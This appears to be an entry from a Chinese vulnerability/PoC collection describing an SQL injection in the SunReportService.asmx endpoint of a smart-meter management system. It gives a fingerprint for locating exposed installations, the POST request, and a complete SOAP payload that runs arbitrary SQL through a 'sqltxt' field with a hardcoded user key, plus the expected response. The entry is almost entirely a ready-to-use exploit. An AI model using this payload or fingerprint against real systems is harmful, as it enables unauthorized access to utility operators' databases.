# 智能表综合管理系统SunReportService.asmxSQL注入漏洞

智能表综合管理系统SunReportService.asmx ｜ SQL注入 ｜ —
- **指纹**：`body="Ajax_Code/Login.ashx"`
- **请求**：`POST /SunReportService.asmx HTTP/1.1`

**Payload**
```
<?xml version="1.0" encoding="utf-8"?>
<soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
<soap:Body>
<GetReportData xmlns="http://suntront.com/">
<sqltxt>select @@VERSION</sqltxt>
<Userkey>XTSunReport</Userkey>
</GetReportData>
</soap:Body>
</soap:Envelope>
```
- **响应特征**：200